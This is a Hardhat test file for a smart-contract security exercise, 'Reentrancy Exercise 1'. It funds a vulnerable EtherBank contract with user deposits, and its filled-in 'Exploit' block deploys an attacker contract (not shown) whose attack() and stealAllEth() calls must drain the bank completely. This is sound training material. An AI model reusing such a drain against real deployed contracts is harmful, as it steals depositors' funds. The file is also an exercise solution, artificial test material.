import { ethers } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { BigNumber } from 'ethers';
import { parseEther } from 'ethers/lib/utils';
import { expect } from 'chai';
import { AttackerReentrancy1, EtherBank, EtherBank__factory } from '../../typechain-types';

describe('Reentrancy Exercise 1', function () {
	let deployer: SignerWithAddress,
		user1: SignerWithAddress,
		user2: SignerWithAddress,
		user3: SignerWithAddress,
		user4: SignerWithAddress,
		attacker: SignerWithAddress;

	let USER1_DEPOSIT = parseEther('12');
	let USER2_DEPOSIT = parseEther('6');
	let USER3_DEPOSIT = parseEther('28');
	let USER4_DEPOSIT = parseEther('63');

	let bank: EtherBank;
	let attackerContract: AttackerReentrancy1;

	let attackerInitialEthBalance: BigNumber;
	let bankInitialBalance: BigNumber;

	before(async function () {
		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

		[deployer, user1, user2, user3, user4, attacker] = await ethers.getSigners();

		const EtherBankFactory = (await ethers.getContractFactory(
			'contracts/reentrancy-1/EtherBank.sol:EtherBank',
			deployer
		)) as EtherBank__factory;

		bank = await EtherBankFactory.deploy();

		await bank.connect(user1).depositETH({ value: USER1_DEPOSIT });
		await bank.connect(user2).depositETH({ value: USER2_DEPOSIT });
		await bank.connect(user3).depositETH({ value: USER3_DEPOSIT });
		await (await bank.connect(user4).depositETH({ value: USER4_DEPOSIT })).wait();

		attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
		bankInitialBalance = await ethers.provider.getBalance(bank.address);

		expect(bankInitialBalance).to.equal(USER1_DEPOSIT.add(USER2_DEPOSIT).add(USER3_DEPOSIT).add(USER4_DEPOSIT));
	});

	it('Exploit', async function () {
		/** CODE YOUR SOLUTION HERE */
		const AttackerReentrancy1Factory = await ethers.getContractFactory('AttackerReentrancy1', attacker);
		attackerContract = await AttackerReentrancy1Factory.deploy(bank.address);
		await attackerContract.connect(attacker).attack({ value: parseEther('1') });
		// await attackerContract.connect(attacker).withdrawETH();
		await attackerContract.connect(attacker).stealAllEth();
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		let bankBalance = await ethers.provider.getBalance(bank.address);
		expect(bankBalance).to.be.equal(0);

		let attackerBalance = await ethers.provider.getBalance(attacker.address);
		expect(attackerBalance).to.be.gt(attackerInitialEthBalance.add(bankInitialBalance).sub(parseEther('0.2')));
	});
});
